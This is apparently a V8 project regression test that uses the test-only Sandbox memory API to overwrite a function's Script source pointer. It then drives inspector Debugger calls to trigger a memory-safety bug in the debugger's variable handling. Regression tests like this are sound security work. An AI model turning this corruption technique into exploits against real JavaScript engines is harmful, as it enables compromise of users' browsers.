// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --enable-inspector --expose-memory-corruption-api
// Flags: --sandbox-testing --fuzzing

const NUM_PARAMS = 60000;
let paramTail = '';
for (let i = 0; i < NUM_PARAMS; i++) paramTail += ',p' + i;
const padLen = paramTail.length;
const head = 'function victim(a';
const tail = '){debugger;}';
const origSource = head + '/*' + 'X'.repeat(padLen - 4) + '*/' + tail;
const corruptSource = head + paramTail + tail;

// Indirect eval to get a Script object
(0, eval)(origSource);

let callFrameId = null;
let step = 0;

function receive(msg) {
    let obj = JSON.parse(msg);
    if (obj.method === "Debugger.paused") {
        callFrameId = obj.params.callFrames[0].callFrameId;
    }
}

function handleInspectorMessage() {
    if (step === 0) {
        if (!callFrameId) return;
        corrupt();
        step = 1;
        send(JSON.stringify({
            id: 3,
            method: "Debugger.setVariableValue",
            params: {
                scopeNumber: 0,
                variableName: "p59999",
                newValue: { value: 42 },
                callFrameId: callFrameId
            }
        }));
    } else if (step === 1) {
        send(JSON.stringify({
            id: 4,
            method: "Debugger.resume"
        }));
        step = 2;
    } else {
        quit();
    }
}

function corrupt() {
    if (typeof Sandbox === 'undefined') return;

    let victim_addr = Sandbox.getAddressOf(victim);
    let view = new DataView(new Sandbox.MemoryView(victim_addr, 32));
    let sfi_ptr = view.getUint32(16, true);
    let sfi_addr = sfi_ptr - 1;

    let sfi_view = new DataView(new Sandbox.MemoryView(sfi_addr, 32));
    let script_ptr = sfi_view.getUint32(20, true);
    let script_addr = script_ptr - 1;

    let script_view = new DataView(new Sandbox.MemoryView(script_addr, 32));
    let corrupt_source_addr = Sandbox.getAddressOf(corruptSource);
    script_view.setUint32(4, corrupt_source_addr | 1, true);
}

send(JSON.stringify({ id: 1, method: "Runtime.enable" }));
send(JSON.stringify({ id: 2, method: "Debugger.enable" }));

victim(1);
